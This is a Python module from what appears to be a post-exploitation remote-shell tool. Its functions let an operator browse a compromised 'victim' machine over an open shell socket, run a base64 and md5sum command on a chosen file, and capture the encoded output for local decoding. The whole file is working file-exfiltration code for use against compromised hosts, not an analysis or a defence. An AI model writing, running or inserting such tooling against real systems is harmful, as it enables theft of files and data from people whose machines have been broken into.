import sys
import os
import time

from transfer.browser import browse_victim, sock_drain, sock_read_until
from ui.menu          import arrow_menu


def do_base64_encode(shell_sock, fd, remote_filepath, filename):
    sys.stdout.write(
        f"\r\n  \033[1;36m[*]\033[0m Encoding \033[1;33m{remote_filepath}\033[0m...\r\n"
    )
    sys.stdout.flush()

    ts         = int(time.time())
    mark_start = f"B64START{ts}"
    mark_end   = f"B64END{ts}"
    mark_md5   = f"MD5DONE{ts}"

    sock_drain(shell_sock, timeout=0.5)
    time.sleep(0.2)

    cmd = (
        f"echo {mark_start}; "
        f"base64 \"{remote_filepath}\"; "
        f"echo {mark_end}; "
        f"md5sum \"{remote_filepath}\"; "
        f"echo {mark_md5}\n"
    )
    shell_sock.sendall(cmd.encode())

    sys.stdout.write(f"  \033[1;36m[*]\033[0m Waiting for output...\r\n")
    sys.stdout.flush()

    buf = sock_read_until(shell_sock, mark_md5, timeout=30)
    sock_drain(shell_sock, timeout=0.5)

    b64_lines = []
    md5_hash  = ""
    in_b64    = False

    for line in buf.splitlines():
        s = line.strip()
        if not s:
            continue
        if mark_start in s:
            in_b64 = True
            continue
        if mark_end in s:
            in_b64 = False
            continue
        if mark_md5 in s:
            break
        if in_b64 and s:
            b64_lines.append(s)
        if not in_b64 and s and not any(
            m in s for m in (mark_start, mark_end, mark_md5, 'base64', 'md5sum', 'echo')
        ):
            parts = s.split()
            if parts and len(parts[0]) == 32 and all(
                c in '0123456789abcdef' for c in parts[0]
            ):
                md5_hash = parts[0]

    b64_data = "\n".join(b64_lines)

    if not b64_data:
        sys.stdout.write(f"  \033[1;31m[!]\033[0m Failed to capture base64 output.\r\n\r\n")
        sys.stdout.flush()
        return False

    sep          = "─" * 58
    b64_filename = filename + ".b64"

    sys.stdout.write(f"\r\n")
    sys.stdout.write(f"  \033[1;32m[+]\033[0m File     : \033[1;33m{filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[1;32m[+]\033[0m MD5      : \033[1;33m{md5_hash if md5_hash else 'unavailable'}\033[0m\r\n")
    sys.stdout.write(f"\r\n")
    sys.stdout.write(f"  \033[1;36m[*]\033[0m Base64 output \033[2m(copy between the lines)\033[0m:\r\n")
    sys.stdout.write(f"  \033[2m{sep}\033[0m\r\n")
    for line in b64_lines:
        sys.stdout.write(f"  {line}\r\n")
    sys.stdout.write(f"  \033[2m{sep}\033[0m\r\n")
    sys.stdout.write(f"\r\n")
    sys.stdout.write(f"  \033[1;36m[*]\033[0m Copy the base64 above into: \033[1;33m{b64_filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[1;36m[*]\033[0m Then run:\r\n")
    sys.stdout.write(f"  \033[1;33m    base64 -d {b64_filename} > {filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[1;33m    md5sum {filename}\033[0m\r\n")
    sys.stdout.write(f"  \033[2m    verify: {md5_hash if md5_hash else 'N/A'}\033[0m\r\n")
    sys.stdout.write(f"\r\n")
    sys.stdout.flush()
    return True


def base64_flow(shell_sock, fd):
    while True:
        remote_filepath, filename = browse_victim(shell_sock, fd)

        if remote_filepath is None:
            return

        success = do_base64_encode(shell_sock, fd, remote_filepath, filename)

        if success:
            what = arrow_menu(fd, "What next?",
                              ["Encode another file", "Back to shell"],
                              color="\033[1;32m")
        else:
            what = arrow_menu(fd, "Encoding failed. What next?",
                              ["Try again", "Back to shell"],
                              color="\033[1;31m")

        if what == 0:
            continue
        else:
            sock_drain(shell_sock, timeout=0.3)
            return
